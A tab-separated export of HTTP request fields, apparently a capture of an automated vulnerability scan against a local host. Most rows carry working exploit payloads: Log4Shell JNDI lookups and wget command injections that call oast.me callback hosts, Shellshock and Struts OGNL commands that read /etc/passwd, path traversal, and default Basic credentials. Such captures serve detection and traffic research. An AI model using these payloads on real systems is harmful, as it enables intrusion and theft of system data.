http.accept	http.accept_encoding	http.accept_language	http.authbasic	http.authcitrix	http.authcitrix.domain	http.authcitrix.password	http.authcitrix.session	http.authcitrix.user	http.authorization	http.bad_header_name	http.cache_control	http.chat	http.chunk_boundary	http.chunk_size	http.chunkd_and_length	http.chunked_trailer_part	http.connection	http.content_encoding	http.content_length	http.content_length_header	http.content_type	http.cookie_pair	http.date	http.decompression_disabled	http.decompression_failed	http.file_data	http.host	http.http2_settings	http.http2_settings_uri	http.last_modified	http.leading_crlf	http.location	http.next_request_in	http.next_response_in	http.notification	http.prev_request_in	http.proxy_authenticate	http.proxy_authorization	http.proxy_connect_host	http.proxy_connect_port	http.referer	http.request	http.request.full_uri	http.request.line	http.request.method	http.request.uri.path	http.request.uri.query	http.request.uri.query.parameter	http.request.version	http.request_in	http.request_number	http.sec_websocket_accept	http.sec_websocket_extensions	http.sec_websocket_key	http.sec_websocket_protocol	http.sec_websocket_version	http.server	http.set_cookie	http.ssl_port	http.subdissector_failed	http.te_and_length	http.te_unknown	http.time	http.tls_port	http.transfer_encoding	http.unknown_header	http.upgrade	http.user_agent	http.www_authenticate	http.x_forwarded_for	http.cookie	http.request.uri
	gzip																close		280	280	application/x-www-form-urlencoded						192.168.1.104															1	http://192.168.1.104/web/ws_utc/resources/setting/options		POST				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36				/web/ws_utc/resources/setting/options
	gzip																close		363	363	application/json						192.168.1.104															1	http://192.168.1.104/web/actuator/env		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/44.0.2403.155 Safari/537.36				/web/actuator/env
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/uploads/elfinder/elfinder-cke.html		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36				/web/uploads/elfinder/elfinder-cke.html
	gzip																close		184	184	application/json						192.168.1.104															1	http://192.168.1.104/web/		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2224.3 Safari/537.36				/web/
	gzip																close		47	47	application/x-www-form-urlencoded						192.168.1.104															1	http://192.168.1.104/web/pages/doenterpagevariables.action		POST				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2866.71 Safari/537.36				/web/pages/doenterpagevariables.action
	gzip																close		42	42	text/plain						192.168.1.104														http://192.168.1.104/mainFrame.htm	1	http://192.168.1.104/web/cgi?7		POST				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2656.18 Safari/537.36			Authorization=Basic YWRtaW46YWRtaW4=	/web/cgi?7
	gzip																close		151	151	application/json						192.168.1.104															1	http://192.168.1.104/web/		POST				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 Safari/537.36				/web/
text/xml	gzip																close		242	242	text/xml						192.168.1.104															1	http://192.168.1.104/web/RPC2		POST				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1944.0 Safari/537.36				/web/RPC2
	gzip																close		47	47	application/x-www-form-urlencoded						192.168.1.104															1	http://192.168.1.104/web/pages/createpage.action?spaceKey=myproj		POST				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36				/web/pages/createpage.action?spaceKey=myproj
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/cfide/scripts/ajax/package/cfajax.js		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2117.157 Safari/537.36				/web/cfide/scripts/ajax/package/cfajax.js
*/*	gzip																close										192.168.1.104															1	http://192.168.1.104/web/?action=command&command=set_city_timezone&value=$(wget%20http://c8ach799m8v918fkv9igcekctkyyyyygn.oast.me))		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.4; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36				/web/?action=command&command=set_city_timezone&value=$(wget%20http://c8ach799m8v918fkv9igcekctkyyyyygn.oast.me))
	gzip																close		142	142	application/x-www-form-urlencoded						192.168.1.104														http://192.168.1.104/web	1	http://192.168.1.104/web/apply_sec.cgi		POST				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2762.73 Safari/537.36				/web/apply_sec.cgi
*/*	gzip	en															close		579	579	application/x-www-form-urlencoded						192.168.1.104															1	http://192.168.1.104/web/user.action		POST				HTTP/1.1																			Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36				/web/user.action
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/system/images/W1siZyIsICJjb252ZXJ0IiwgIi1zaXplIDF4MSAtZGVwdGggOCBncmF5Oi9ldGMvcGFzc3dkIiwgIm91dCJdXQ==		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.3319.102 Safari/537.36				/web/system/images/W1siZyIsICJjb252ZXJ0IiwgIi1zaXplIDF4MSAtZGVwdGggOCBncmF5Oi9ldGMvcGFzc3dkIiwgIm91dCJdXQ==
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/system/refinery/images/W1siZyIsICJjb252ZXJ0IiwgIi1zaXplIDF4MSAtZGVwdGggOCBncmF5Oi9ldGMvcGFzc3dkIiwgIm91dCJdXQ==		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/44.0.2403.155 Safari/537.36				/web/system/refinery/images/W1siZyIsICJjb252ZXJ0IiwgIi1zaXplIDF4MSAtZGVwdGggOCBncmF5Oi9ldGMvcGFzc3dkIiwgIm91dCJdXQ==
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/CF_SFSD/scripts/ajax/package/cfajax.js		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/44.0.2403.155 Safari/537.36				/web/CF_SFSD/scripts/ajax/package/cfajax.js
	gzip		guest:guest						Basic Z3Vlc3Q6Z3Vlc3Q=								close		30	30							192.168.1.104														http://192.168.1.104/web/tools.cgi	1	http://192.168.1.104/web/tools.cgi		POST				HTTP/1.1																			Mozilla/5.0 (X11; OpenBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36				/web/tools.cgi
	gzip																close										192.168.1.104															1	http://192.168.1.104/web/graph_realtime.php?action=init		GET				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1944.0 Safari/537.36			Cacti=%3Bwget%20http%3A//c8ach799m8v918fkv9igcekctjayyyyde.oast.me	/web/graph_realtime.php?action=init
text/javascript, text/html, application/xml, text/xml, */*	gzip, deflate	en-US,en;q=0.5															close		260	260	application/json; charset=UTF-8						192.168.1.104														http://192.168.1.104/web	1	http://192.168.1.104/web/var		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.4; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36				/web/var
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/install/lib/ajaxHandlers/ajaxServerSettingsChk.php?rootUname=%3b%63%61%74%20%2f%65%74%63%2f%70%61%73%73%77%64%20%23		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.4; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36				/web/install/lib/ajaxHandlers/ajaxServerSettingsChk.php?rootUname=%3b%63%61%74%20%2f%65%74%63%2f%70%61%73%73%77%64%20%23
*/*	gzip	en															close		116	116	application/json; charset=utf-8						192.168.1.104															1	http://192.168.1.104/web/api/timelion/run		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36				/web/api/timelion/run
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/%24%7B%28%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23a%3D@java.lang.Runtime@getRuntime%28%29.exec%28%27cat%20/etc/passwd%27%29.getInputStream%28%29%2C%23b%3Dnew%20java.io.InputStreamReader%28%23a%29%2C%23c%3Dnew%20%20java.io.BufferedReader%28%23b%29%2C%23d%3Dnew%20char%5B51020%5D%2C%23c.read%28%23d%29%2C%23sbtest%3D@org.apache.struts2.ServletActionContext@getResponse%28%29.getWriter%28%29%2C%23sbtest.println%28%23d%29%2C%23sbtest.close%28%29%29%7D/actionChain1.action		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36				/web/%24%7B%28%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23a%3D@java.lang.Runtime@getRuntime%28%29.exec%28%27cat%20/etc/passwd%27%29.getInputStream%28%29%2C%23b%3Dnew%20java.io.InputStreamReader%28%23a%29%2C%23c%3Dnew%20%20java.io.BufferedReader%28%23b%29%2C%23d%3Dnew%20char%5B51020%5D%2C%23c.read%28%23d%29%2C%23sbtest%3D@org.apache.struts2.ServletActionContext@getResponse%28%29.getWriter%28%29%2C%23sbtest.println%28%23d%29%2C%23sbtest.close%28%29%29%7D/actionChain1.action
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/?id=nuclei%25{128*128}		GET				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2762.73 Safari/537.36				/web/?id=nuclei%25{128*128}
text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8	gzip																close		104	104	application/x-www-form-urlencoded						192.168.1.104														http://192.168.1.104/web/diag_ping_admin_en.asp	1	http://192.168.1.104/web/boaform/admin/formTracert		POST				HTTP/1.1																			Mozilla/5.0 (X11; OpenBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36				/web/boaform/admin/formTracert
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/cfide-scripts/ajax/package/cfajax.js		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36				/web/cfide-scripts/ajax/package/cfajax.js
*/*	gzip	en															close		101	101							192.168.1.104															1	http://192.168.1.104/web/wp-content/plugins/wsecure/wsecure-config.php		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.3319.102 Safari/537.36				/web/wp-content/plugins/wsecure/wsecure-config.php
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/tag_test_action.php?url=a&token=&partcode={dede:field%20name=%27source%27%20runphp=%27yes%27}phpinfo();{/dede:field}		GET				HTTP/1.1																			Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.137 Safari/4E423F				/web/tag_test_action.php?url=a&token=&partcode={dede:field%20name=%27source%27%20runphp=%27yes%27}phpinfo();{/dede:field}
	gzip																close		200	200	application/json; charset=UTF-8						192.168.1.104															1	http://192.168.1.104/web/wp-json/buddypress/v1/signup		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/44.0.2403.155 Safari/537.36				/web/wp-json/buddypress/v1/signup
	gzip																close		133	133	application/json;charset=UTF-8						192.168.1.104															1	http://192.168.1.104/web/api/user/reg		POST				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36				/web/api/user/reg
	gzip																close		850	850	multipart/form-data; boundary=---------------------------24464570528145						192.168.1.104															1	http://192.168.1.104/web/cf_scripts/scripts/ajax/ckeditor/plugins/filemanager/upload.cfm		POST				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 Safari/537.36				/web/cf_scripts/scripts/ajax/ckeditor/plugins/filemanager/upload.cfm
*/*	gzip																close		721	721	multipart/form-data; boundary=6985fa39c0698d07f6d418b37388e1b2						192.168.1.104															1	http://192.168.1.104/web/wp-content/plugins/simple-file-list/ee-upload-engine.php		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2117.157 Safari/537.36				/web/wp-content/plugins/simple-file-list/ee-upload-engine.php
	gzip																close		89	89							192.168.1.104															1	http://192.168.1.104/web/cgi-bin/mainfunction.cgi		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36				/web/cgi-bin/mainfunction.cgi
*/*	gzip																close		88	88							192.168.1.104															1	http://192.168.1.104/web/login.htm		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 4.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36				/web/login.htm
	gzip																close		54	54	application/x-www-form-urlencoded						192.168.1.104															1	http://192.168.1.104/web/mailingupgrade.php		POST				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2762.73 Safari/537.36				/web/mailingupgrade.php
	gzip																close				application/json, text/plain, */*						192.168.1.104															1	http://192.168.1.104/web/api/group/list		GET				HTTP/1.1																			Mozilla/5.0 (X11; Ubuntu; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2820.59 Safari/537.36				/web/api/group/list
*/*	gzip	en															close										192.168.1.104														() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd	1	http://192.168.1.104/web		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2117.157 Safari/537.36			() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd	/web
${jndi:ldap://${hostName}.accept.c8ach799m8v918fkv9igcekctjayyyyrw.oast.me}	${jndi:ldap://${hostName}.acceptencoding.c8ach799m8v918fkv9igcekctjayyyyrs.oast.me}	${jndi:ldap://${hostName}.acceptlanguage.c8ach799m8v918fkv9igcekctjayyyyra.oast.me}															close										192.168.1.104					${jndi:ldap://${hostName}.location.c8ach799m8v918fkv9igcekctjayyyyfg.oast.me}									${jndi:ldap://${hostName}.referer.c8ach799m8v918fkv9igcekctjayyyyfk.oast.me}	1	http://192.168.1.104/web/?x=${jndi:ldap://${hostName}.c8ach799m8v918fkv9igcekctjayyyyr1.oast.me/a}		GET				HTTP/1.1																			${jndi:ldap://${hostName}.useragent.c8ach799m8v918fkv9igcekctjayyyyfq.oast.me}		${jndi:ldap://${hostName}.xforwardedfor.c8ach799m8v918fkv9igcekctjayyyyfs.oast.me}	${jndi:ldap://${hostName}.cookiename.c8ach799m8v918fkv9igcekctjayyyyfn.oast.me}=${jndi:ldap://${hostName}.cookievalue.c8ach799m8v918fkv9igcekctjayyyyfr.oast.me}	/web/?x=${jndi:ldap://${hostName}.c8ach799m8v918fkv9igcekctjayyyyr1.oast.me/a}
	gzip																close										192.168.1.104															1	http://192.168.1.104/web/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2309.372 Safari/537.36				/web/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/infusions/downloads/downloads.php?cat_id=${system(ls)}		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36				/web/infusions/downloads/downloads.php?cat_id=${system(ls)}
*/*	gzip	en															close		0	0							192.168.1.104															1	http://192.168.1.104/web/?name=%25%7B%28%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%29.%28%23_memberAccess%3F%28%23_memberAccess%3D%23dm%29%3A%28%28%23container%3D%23context%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ognlUtil%3D%23container.getInstance%28%40com.opensymphony.xwork2.ognl.OgnlUtil%40class%29%29.%28%23ognlUtil.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ognlUtil.getExcludedClasses%28%29.clear%28%29%29.%28%23context.setMemberAccess%28%23dm%29%29%29%29.%28%23cmd%3D%27cat%20/etc/passwd%27%29.%28%23iswin%3D%28%40java.lang.System%40getProperty%28%27os.name%27%29.toLowerCase%28%29.contains%28%27win%27%29%29%29.%28%23cmds%3D%28%23iswin%3F%7B%27cmd.exe%27%2C%27/c%27%2C%23cmd%7D%3A%7B%27/bin/bash%27%2C%27-c%27%2C%23cmd%7D%29%29.%28%23p%3Dnew%20java.lang.ProcessBuilder%28%23cmds%29%29.%28%23p.redirectErrorStream%28true%29%29.%28%23process%3D%23p.start%28%29%29.%28%40org.apache.commons.io.IOUtils%40toString%28%23process.getInputStream%28%29%29%29%7D		POST				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1944.0 Safari/537.36				/web/?name=%25%7B%28%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%29.%28%23_memberAccess%3F%28%23_memberAccess%3D%23dm%29%3A%28%28%23container%3D%23context%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ognlUtil%3D%23container.getInstance%28%40com.opensymphony.xwork2.ognl.OgnlUtil%40class%29%29.%28%23ognlUtil.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ognlUtil.getExcludedClasses%28%29.clear%28%29%29.%28%23context.setMemberAccess%28%23dm%29%29%29%29.%28%23cmd%3D%27cat%20/etc/passwd%27%29.%28%23iswin%3D%28%40java.lang.System%40getProperty%28%27os.name%27%29.toLowerCase%28%29.contains%28%27win%27%29%29%29.%28%23cmds%3D%28%23iswin%3F%7B%27cmd.exe%27%2C%27/c%27%2C%23cmd%7D%3A%7B%27/bin/bash%27%2C%27-c%27%2C%23cmd%7D%29%29.%28%23p%3Dnew%20java.lang.ProcessBuilder%28%23cmds%29%29.%28%23p.redirectErrorStream%28true%29%29.%28%23process%3D%23p.start%28%29%29.%28%40org.apache.commons.io.IOUtils%40toString%28%23process.getInputStream%28%29%29%29%7D
*/*	gzip																close		81	81	application/x-www-form-urlencoded						192.168.1.104															1	http://192.168.1.104/web/wp-content/plugins/simple-file-list/ee-file-engine.php		POST				HTTP/1.1																			Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2919.83 Safari/537.36				/web/wp-content/plugins/simple-file-list/ee-file-engine.php
*/*	gzip																close		91	91							192.168.1.104															1	http://192.168.1.104/web/cgi-bin/system_mgr.cgi?		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.93 Safari/537.36				/web/cgi-bin/system_mgr.cgi?
	gzip																close		88	88							192.168.1.104															1	http://192.168.1.104/web/		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.3319.102 Safari/537.36			uid=6gPjT2ipmNz	/web/
	gzip																close		4938	4938	application/x-www-form-urlencoded						192.168.1.104														http://192.168.1.104/web/api/jsonws?contextName=&signature=%2Fexpandocolumn%2Fadd-column-4-tableId-name-type-defaultData	1	http://192.168.1.104/web/api/jsonws/invoke		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36				/web/api/jsonws/invoke
*/*	gzip	en															close										192.168.1.104														() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd	1	http://192.168.1.104/web/cgi-bin/status		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2224.3 Safari/537.36			() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd	/web/cgi-bin/status
*/*	gzip																close										192.168.1.104															1	http://192.168.1.104/web/wp-content/uploads/simple-file-list/nuclei.php		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.93 Safari/537.36				/web/wp-content/uploads/simple-file-list/nuclei.php
text/html	gzip																close		185	185	multipart/form-data; boundary=----WebKitFormBoundarySHHbUsfCoxlX1bpS						192.168.1.104														http://192.168.1.104/web	1	http://192.168.1.104/web/logupload?logMetaData=%7B%22itrLogPath%22%3A%20%22..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fhttpd%2Fhtml%2Fwsgi_log_upload%22%2C%20%22logFileType%22%3A%20%22log_upload_wsgi.py%22%2C%20%22workloadID%22%3A%20%222%22%7D		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2226.0 Safari/537.36				/web/logupload?logMetaData=%7B%22itrLogPath%22%3A%20%22..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fhttpd%2Fhtml%2Fwsgi_log_upload%22%2C%20%22logFileType%22%3A%20%22log_upload_wsgi.py%22%2C%20%22workloadID%22%3A%20%222%22%7D
